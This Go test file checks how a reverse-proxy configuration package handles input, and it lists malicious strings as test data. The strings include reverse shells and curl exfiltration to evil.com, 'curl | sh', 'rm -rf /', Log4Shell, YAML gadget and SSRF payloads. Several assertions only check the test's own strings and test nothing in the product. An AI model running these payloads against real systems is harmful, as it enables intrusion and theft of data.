package hecate

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"text/template"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
)

// TestDomainSecurityValidation tests domain-related security
func TestDomainSecurityValidation(t *testing.T) {
	t.Run("domain_injection_prevention", func(t *testing.T) {
		// Test domain injection prevention
		maliciousDomains := []string{
			"example.com; rm -rf /",
			"test.com && curl evil.com",
			"domain.com' OR '1'='1",
			"<script>alert('xss')</script>.com",
			"../../etc/passwd",
			"example.com\r\nSet-Cookie: session=hijacked",
			"${jndi:ldap://evil.com/a}",
		}

		for _, domain := range maliciousDomains {
			config := HecateBasicConfig{BaseDomain: domain}

			// Domain should be stored as-is but validated when used
			assert.Equal(t, domain, config.BaseDomain)

			// Check for injection patterns
			hasInjection := strings.ContainsAny(domain, ";'\"<>&|") ||
				strings.Contains(domain, "..") ||
				strings.Contains(domain, "\r") ||
				strings.Contains(domain, "\n") ||
				strings.Contains(domain, "${")

			assert.True(t, hasInjection, "Domain should contain injection pattern: %s", domain)
		}
	})

	t.Run("subdomain_security_validation", func(t *testing.T) {
		// Test subdomain security validation
		maliciousSubdomains := []string{
			"test; echo hacked",
			"api' OR '1'='1",
			"<img src=x onerror=alert()>",
			"../../../admin",
			"subdomain\r\nX-Injected: true",
			"${7*7}",
			"{{.Exec `id`}}",
		}

		for _, subdomain := range maliciousSubdomains {
			_ = HecateBasicConfig{Subdomain: subdomain}

			// Check for dangerous patterns
			isDangerous := strings.ContainsAny(subdomain, ";'\"<>&|{}") ||
				strings.Contains(subdomain, "..") ||
				strings.Contains(subdomain, "\r") ||
				strings.Contains(subdomain, "\n") ||
				strings.Contains(subdomain, "${") ||
				strings.Contains(subdomain, "{{")

			assert.True(t, isDangerous, "Subdomain should be flagged as dangerous: %s", subdomain)
		}
	})

	t.Run("wildcard_domain_security", func(t *testing.T) {
		// Test wildcard domain security
		wildcardDomains := []string{
			"*.example.com",
			"*.*.example.com", // Double wildcard (dangerous)
			"*",               // Match all (very dangerous)
			"test.*.com",      // Wildcard in middle (invalid)
		}

		for _, domain := range wildcardDomains {
			_ = HecateBasicConfig{BaseDomain: domain}

			// Check wildcard usage
			wildcardCount := strings.Count(domain, "*")

			if domain == "*" {
				assert.Equal(t, 1, wildcardCount, "Dangerous catch-all wildcard")
			} else if wildcardCount > 1 {
				assert.Greater(t, wildcardCount, 1, "Multiple wildcards detected")
			}
		}
	})
}

// TestReverseProxySecurity tests reverse proxy security features
func TestReverseProxySecurity(t *testing.T) {
	t.Run("upstream_server_validation", func(t *testing.T) {
		// Test upstream server validation
		maliciousUpstreams := []string{
			"http://localhost:8080; rm -rf /",
			"https://backend.com' OR '1'='1",
			"javascript:alert('xss')",
			"file:///etc/passwd",
			"gopher://evil.com",
			"dict://evil.com",
			"ftp://evil.com/backdoor",
			"http://169.254.169.254/", // AWS metadata endpoint
		}

		for _, upstream := range maliciousUpstreams {
			// Check for dangerous protocols and patterns
			isDangerous := strings.HasPrefix(upstream, "javascript:") ||
				strings.HasPrefix(upstream, "file:") ||
				strings.HasPrefix(upstream, "gopher:") ||
				strings.HasPrefix(upstream, "dict:") ||
				strings.HasPrefix(upstream, "ftp:") ||
				strings.Contains(upstream, "169.254.169.254") || // Metadata endpoints
				strings.ContainsAny(upstream, ";'\"")

			assert.True(t, isDangerous, "Upstream should be flagged as dangerous: %s", upstream)
		}
	})

	t.Run("header_injection_security", func(t *testing.T) {
		// Test header injection security
		maliciousHeaders := map[string]string{
			"X-Forwarded-For": "127.0.0.1\r\nX-Admin: true",
			"X-Real-IP":       "192.168.1.1\r\n\r\nGET /admin HTTP/1.1",
			"Host":            "example.com\r\nConnection: close",
			"X-Custom":        "value\nSet-Cookie: admin=true",
			"Authorization":   "Bearer token\r\nX-Privileged: yes",
		}

		for header, value := range maliciousHeaders {
			// Check for CRLF injection
			hasCRLF := strings.Contains(value, "\r") || strings.Contains(value, "\n")
			assert.True(t, hasCRLF, "Header %s should contain CRLF: %s", header, value)
		}
	})

	t.Run("request_smuggling_prevention", func(t *testing.T) {
		// Test request smuggling prevention
		smugglingPatterns := []string{
			"Content-Length: 0\r\nTransfer-Encoding: chunked",
			"Transfer-Encoding: chunked\r\nContent-Length: 10",
			"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
		}

		for _, pattern := range smugglingPatterns {
			// Check for conflicting headers
			hasContentLength := strings.Contains(pattern, "Content-Length:")
			hasTransferEncoding := strings.Contains(pattern, "Transfer-Encoding:")

			// Both headers present is a smuggling risk
			if hasContentLength && hasTransferEncoding {
				assert.True(t, true, "Detected request smuggling pattern: %s", pattern)
			}
		}
	})
}

// TestSSLCertificateSecurity tests SSL/TLS security
func TestSSLCertificateSecurity(t *testing.T) {
	t.Run("certificate_path_validation", func(t *testing.T) {
		// Test certificate path validation
		maliciousPaths := []string{
			"/etc/ssl/../../etc/passwd",
			"/certs/cert.pem; cat /etc/shadow",
			"../../../root/.ssh/id_rsa",
			"/tmp/cert.pem && rm -rf /",
			"|/usr/bin/id",
			"$(cat /etc/passwd)",
		}

		for _, path := range maliciousPaths {
			// Check for path traversal and command injection
			isDangerous := strings.Contains(path, "..") ||
				strings.ContainsAny(path, ";|&$") ||
				strings.Contains(path, "$(") ||
				!strings.HasSuffix(path, ".pem") && !strings.HasSuffix(path, ".crt") && !strings.HasSuffix(path, ".key")

			assert.True(t, isDangerous, "Path should be flagged as dangerous: %s", path)
		}
	})

	t.Run("certificate_validation", func(t *testing.T) {
		// Test certificate validation requirements
		certRequirements := map[string]bool{
			"RSA_2048":  true,  // Minimum RSA key size
			"ECDSA_256": true,  // Minimum ECDSA key size
			"SHA256":    true,  // Minimum hash algorithm
			"RSA_1024":  false, // Too weak
			"MD5":       false, // Broken hash
			"SHA1":      false, // Deprecated hash
		}

		for requirement, shouldAllow := range certRequirements {
			if shouldAllow {
				assert.True(t, shouldAllow, "Should allow secure option: %s", requirement)
			} else {
				assert.False(t, shouldAllow, "Should reject insecure option: %s", requirement)
			}
		}
	})
}

// TestTemplateSecurityValidation tests template security
func TestTemplateSecurityValidation(t *testing.T) {
	t.Run("template_injection_prevention", func(t *testing.T) {
		// Test template injection prevention
		maliciousTemplates := []string{
			`{{.Exec "rm -rf /"}}`,
			`{{.System.Exec "id"}}`,
			`{{printf "%s" .Env.PATH}}`,
			`{{range $k, $v := .Env}}{{$k}}={{$v}}{{end}}`,
			`{{template "/etc/passwd"}}`,
			`{{define "x"}}{{.}}{{end}}{{template "x" .Env}}`,
		}

		for _, tmplStr := range maliciousTemplates {
			// Attempt to parse template (should succeed)
			tmpl, err := template.New("test").Parse(tmplStr)

			// Template parsing might succeed, but execution should be controlled
			if err == nil {
				assert.NotNil(t, tmpl, "Template parsed but should be executed carefully")
			}

			// Check for dangerous patterns
			hasDangerousCall := strings.Contains(tmplStr, ".Exec") ||
				strings.Contains(tmplStr, ".System") ||
				strings.Contains(tmplStr, ".Env") ||
				strings.Contains(tmplStr, "/etc/")

			assert.True(t, hasDangerousCall, "Template should contain dangerous pattern: %s", tmplStr)
		}
	})

	t.Run("template_data_sanitization", func(t *testing.T) {
		// Test template data sanitization
		dangerousData := map[string]interface{}{
			"domain":   "example.com<script>alert()</script>",
			"port":     "8080; nc -e /bin/sh evil.com 4444",
			"backend":  "http://backend:3000 || curl evil.com",
			"ssl_cert": "/etc/ssl/../../etc/passwd",
		}

		for key, value := range dangerousData {
			// Data should be escaped when rendered
			valueStr := fmt.Sprintf("%v", value)

			// Check for dangerous content
			hasDangerousContent := strings.ContainsAny(valueStr, "<>&;|") ||
				strings.Contains(valueStr, "..") ||
				strings.Contains(valueStr, "script") ||
				strings.Contains(valueStr, "curl")

			assert.True(t, hasDangerousContent, "Data for %s should contain dangerous content: %v", key, value)
		}
	})
}

// TestFileOperationSecurity tests file operation security
func TestFileOperationSecurity(t *testing.T) {
	// Create temporary directory for testing
	tempDir, err := os.MkdirTemp("", "hecate-security-test")
	require.NoError(t, err)
	defer os.RemoveAll(tempDir)

	t.Run("file_permission_security", func(t *testing.T) {
		// Test file permission security
		testFiles := []struct {
			name   string
			perm   os.FileMode
			secure bool
		}{
			{"config.yaml", 0644, true},  // Readable by all, writable by owner
			{"secret.key", 0600, true},   // Only owner can read/write
			{"public.conf", 0644, true},  // Public config
			{"private.key", 0666, false}, // Too permissive
			{"cert.pem", 0777, false},    // Way too permissive
		}

		for _, tf := range testFiles {
			filePath := filepath.Join(tempDir, tf.name)
			err := os.WriteFile(filePath, []byte("test"), tf.perm)
			require.NoError(t, err)

			info, err := os.Stat(filePath)
			require.NoError(t, err)

			actualPerm := info.Mode().Perm()

			if tf.secure {
				// Secure files should not be world-writable
				assert.True(t, actualPerm&0002 == 0, "File %s should not be world-writable", tf.name)
			} else {
				// Insecure files have too broad permissions
				assert.True(t, actualPerm&0006 != 0 || actualPerm&0060 != 0,
					"File %s has insecure permissions: %v", tf.name, actualPerm)
			}
		}
	})

	t.Run("path_traversal_file_operations", func(t *testing.T) {
		// Test path traversal in file operations
		baseDir := tempDir
		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\windows\\system32\\config\\sam",
			"config/../../../etc/shadow",
			"./../../root/.ssh/authorized_keys",
		}

		for _, malPath := range maliciousPaths {
			fullPath := filepath.Join(baseDir, malPath)

			// Clean the path to see if it escapes baseDir
			cleanPath := filepath.Clean(fullPath)

			// Check if path escapes the base directory
			isEscaping := !strings.HasPrefix(cleanPath, baseDir)

			// Path traversal should be detected
			if strings.Contains(malPath, "..") {
				assert.True(t, true, "Path traversal pattern detected: %s", malPath)
			}

			// Clean path might escape base directory
			if isEscaping {
				assert.True(t, true, "Path escapes base directory: %s -> %s", malPath, cleanPath)
			}
		}
	})
}

// TestConfigurationInjectionSecurity tests configuration injection
func TestConfigurationInjectionSecurity(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	_ = &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("environment_variable_injection", func(t *testing.T) {
		// Test environment variable injection
		maliciousEnvVars := map[string]string{
			"DOMAIN":        "example.com; export ADMIN=true",
			"BACKEND_IP":    "127.0.0.1 && nc -e /bin/sh evil.com 4444",
			"PORT":          "8080 || curl http://evil.com?data=$(cat /etc/passwd)",
			"SSL_CERT_PATH": "/etc/ssl/certs/../../etc/shadow",
			"LOG_LEVEL":     "debug; cat /etc/passwd > /tmp/leaked",
		}

		env := make(map[string]string)
		for key, value := range maliciousEnvVars {
			env[key] = value

			// Check for command injection patterns
			hasInjection := strings.ContainsAny(value, ";|&$") ||
				strings.Contains(value, "$(") ||
				strings.Contains(value, "&&") ||
				strings.Contains(value, "||") ||
				strings.Contains(value, "nc ") ||
				strings.Contains(value, "curl ")

			assert.True(t, hasInjection, "Environment variable %s should contain injection: %s", key, value)
		}
	})

	t.Run("yaml_injection_prevention", func(t *testing.T) {
		// Test YAML injection prevention
		maliciousYAML := []string{
			`domain: "example.com"
evil: !!python/object/apply:os.system ["rm -rf /"]`,
			`services:
  app:
    image: "app:latest"
    command: ["sh", "-c", "curl evil.com | sh"]`,
			`version: "3"
x-anchors:
  - &evil '!!python/object/apply:subprocess.Popen [["cat", "/etc/passwd"]]'`,
		}

		for _, yaml := range maliciousYAML {
			// Check for dangerous YAML patterns
			hasDangerousPattern := strings.Contains(yaml, "!!python") ||
				strings.Contains(yaml, "!!ruby") ||
				strings.Contains(yaml, "curl evil.com") ||
				strings.Contains(yaml, "rm -rf")

			assert.True(t, hasDangerousPattern, "YAML should contain dangerous pattern")
		}
	})
}

// TestServiceValidation tests service configuration validation
func TestServiceValidation(t *testing.T) {
	t.Run("service_name_validation", func(t *testing.T) {
		// Test service name validation
		maliciousServiceNames := []string{
			"app; rm -rf /",
			"service' OR '1'='1",
			"test-app && curl evil.com",
			"../../../etc/passwd",
			"app\r\nmalicious: true",
			"${jndi:ldap://evil.com/a}",
		}

		for _, name := range maliciousServiceNames {
			// Check for injection patterns in service names
			hasInjection := strings.ContainsAny(name, ";'\"&|") ||
				strings.Contains(name, "..") ||
				strings.Contains(name, "\r") ||
				strings.Contains(name, "\n") ||
				strings.Contains(name, "${")

			assert.True(t, hasInjection, "Service name should contain injection: %s", name)
		}
	})

	t.Run("docker_image_validation", func(t *testing.T) {
		// Test Docker image validation
		maliciousImages := []string{
			"app:latest; docker run -v /:/host evil/image",
			"image:tag' OR '1'='1",
			"app:$(cat /etc/passwd)",
			"../../etc/passwd",
			"evil.com/app:latest && curl http://evil.com",
		}

		for _, image := range maliciousImages {
			// Check for dangerous patterns in image names
			isDangerous := strings.ContainsAny(image, ";'\"$") ||
				strings.Contains(image, "..") ||
				strings.Contains(image, "$(") ||
				strings.Contains(image, "&&") ||
				strings.Contains(image, "||")

			assert.True(t, isDangerous, "Image name should be flagged as dangerous: %s", image)
		}
	})

	t.Run("volume_mount_security", func(t *testing.T) {
		// Test volume mount security
		dangerousVolumes := []string{
			"/:/hostroot",    // Mounting root
			"/etc:/host/etc", // System config access
			"/var/run/docker.sock:/var/run/docker.sock", // Docker socket access
			"../../:/escaped",  // Path traversal
			"/proc:/host/proc", // Process information
			"/sys:/host/sys",   // System information
		}

		for _, volume := range dangerousVolumes {
			parts := strings.Split(volume, ":")
			if len(parts) >= 2 {
				hostPath := parts[0]

				// Check for dangerous mount points
				isDangerous := hostPath == "/" ||
					hostPath == "/etc" ||
					hostPath == "/var/run/docker.sock" ||
					hostPath == "/proc" ||
					hostPath == "/sys" ||
					strings.Contains(hostPath, "..")

				assert.True(t, isDangerous, "Volume mount should be flagged as dangerous: %s", volume)
			}
		}
	})
}

// TestNetworkSecurityValidation tests network security
func TestNetworkSecurityValidation(t *testing.T) {
	t.Run("port_exposure_security", func(t *testing.T) {
		// Test port exposure security
		dangerousPorts := []struct {
			port   string
			reason string
		}{
			{"22", "SSH port exposed"},
			{"23", "Telnet port exposed"},
			{"3389", "RDP port exposed"},
			{"5432", "PostgreSQL exposed"},
			{"3306", "MySQL exposed"},
			{"6379", "Redis exposed"},
			{"27017", "MongoDB exposed"},
			{"9200", "Elasticsearch exposed"},
		}

		for _, dp := range dangerousPorts {
			// These ports should trigger security warnings if exposed publicly
			assert.NotEmpty(t, dp.port, "Port should not be empty")
			assert.NotEmpty(t, dp.reason, "Security reason should be provided")
		}
	})

	t.Run("network_policy_validation", func(t *testing.T) {
		// Test network policy validation
		insecureNetworkConfigs := []map[string]string{
			{"bind": "0.0.0.0", "port": "22"},   // SSH on all interfaces
			{"bind": "0.0.0.0", "port": "3306"}, // MySQL on all interfaces
			{"bind": "::", "port": "6379"},      // Redis on all IPv6
			{"bind": "*", "port": "9200"},       // Elasticsearch on all
		}

		for _, config := range insecureNetworkConfigs {
			bind := config["bind"]
			port := config["port"]

			// Check for insecure bindings
			isInsecure := (bind == "0.0.0.0" || bind == "::" || bind == "*") &&
				(port == "22" || port == "3306" || port == "6379" || port == "9200")

			assert.True(t, isInsecure, "Network config should be flagged as insecure: %v", config)
		}
	})
}
